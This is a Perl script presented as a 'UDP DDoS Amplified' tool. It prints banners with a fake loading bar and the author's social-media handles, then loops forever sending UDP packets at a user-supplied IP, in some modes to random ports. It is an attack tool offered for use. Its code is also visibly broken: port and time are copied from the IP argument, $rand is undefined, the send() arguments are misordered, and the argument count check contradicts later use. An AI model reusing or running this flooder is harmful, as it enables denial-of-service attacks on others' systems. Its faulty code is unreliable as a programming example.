#!/usr/bin/perl
use Socket;
$ARGC=@ARGV;
my ($ip,$port,$size,$time);
if ($ARGC !=1) {
printf "[0;32m#############################################################################\n";
printf "[0;32m# Comanda este simpla, doar";  printf "[0;31m perl h4e IP ";printf "[0;32mqmetre # script by: cipriZEUL #\n";
printf "[0;32m# Arhiva este simpla, 65500 basic - oc to 995500 - By Ciprian           #\n";
printf "[0;32m#############################################################################\n";

exit(1);
}
$ip=$ARGV[0];
$port=$ARGV[0];
$time=$ARGV[0];
socket(crazy, PF_INET, SOCK_DGRAM, 17);
$iaddr = inet_aton("$ip");

printf "[1;36m[                          Loading ...                           ]\n";
sleep 3;
printf "[1;36m[###                                                             ]\n";
sleep 1;
printf "[1;36m[#####                                                           ]\n";
sleep 1;
printf "[1;36m[########                                                        ]\n";
sleep 1;
printf "[1;36m[##########                                                      ]\n";
sleep 1;
printf "[1;36m[################                                                ]\n";
sleep 1;
printf "[1;36m[#########################                                       ]\n";
sleep 1;
printf "[1;36m[##############################                                  ]\n";
sleep 1;
printf "[1;36m[######################################                          ]\n";
sleep 1;
printf "[1;36m[################################################                ]\n";
sleep 1;
printf "[1;36m[###################################################             ]\n";
sleep 1;
printf "[1;36m[########################################################        ]\n";
sleep 1;
printf "[1;36m[############################################################    ]\n";
sleep 1;
printf "[1;36m[#############################################################   ]\n";
sleep 1;
printf "[1;36m[################################################################] - 100%\n";
clear;


printf "[0;32m###############################################################################\n";
printf "[0;31m# For contact Ciprian- Insta : ciprian.angelescu  or  facebook Angelescu Ciprian #\n";
printf "[0;32m###############################################################################\n";
printf "[0;31m# UDP DDoS Amplified by CIprian - UDP DDoS Started to $ip \n";
printf "[0;32m###############################################################################\n";
printf "[0;31m# Press simultaneous [CTRL + C] for stop DDoS.              # 2k19 h4e remake #\n";
printf "[0;32m###############################################################################\n";
printf "[0;31m# Script by Cypryx - God of Hacking - I will never forget H4E-Team        #\n";
printf "[0;32m###############################################################################\n";

if ($ARGV[1] ==0 && $ARGV[2] ==0) {
goto randpackets;
}
if ($ARGV[1] !=0 && $ARGV[2] !=0) {
system("(sleep $time;killall -9 udp) &");
goto packets;
}
if ($ARGV[1] !=0 && $ARGV[2] ==0) {
goto packets;
}
if ($ARGV[1] ==0 && $ARGV[2] !=0) {
system("(sleep $time;killall -9 udp) &");
goto randpackets;
}
packets:
for (;;) {
$size=$rand x $rand x $rand;
send(crazy, 65500, $size, sockaddr_in($port, $iaddr));
}
randpackets:
for (;;) {
$size=$rand x $rand x $rand;
$port=int(rand 65500) +1;
send(crazy, 65500, $size, sockaddr_in($port, $iaddr));
}
